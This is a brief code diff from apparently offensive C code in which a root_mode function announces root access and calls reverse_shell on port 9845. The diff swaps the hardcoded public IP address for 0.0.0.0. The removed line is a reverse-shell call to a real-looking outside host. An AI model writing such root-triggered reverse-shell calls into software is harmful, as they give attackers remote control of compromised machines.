@@ -49,7 +49,7 @@ int sudo_mode(int argc, char ** argv){
 
 int root_mode(int argc, char**argv){
   printf("I have root acess now...\n");
-  reverse_shell(9845, "206.189.197.67");
+  reverse_shell(9845, "0.0.0.0");
   while(1){
     sleep(1);
     printf("...\n");
